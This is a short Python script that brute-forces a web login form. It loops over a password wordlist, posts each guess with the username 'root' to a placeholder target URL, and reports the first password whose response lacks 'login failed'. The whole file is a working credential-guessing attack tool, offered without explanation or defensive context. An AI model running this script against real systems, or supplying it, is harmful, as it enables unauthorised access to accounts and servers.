#!/usr/bin/env python

import requests

target_url = "yourwebsite.com"
data_dictionary = {"username": "root", "password": "", "Login": "submit"}

with open("/directory*/path*/folder*/passwords.txt", "r") as passwords_file:
    for p_line in passwords_file:
        passwd = p_line.strip()
        data_dictionary["password"] = passwd
        response = requests.post(target_url, data=data_dictionary)
        if "login failed" not in response.content.decode():
            print("[+] Password found --> " + passwd)
            exit()

print("[+] Password not found! ")

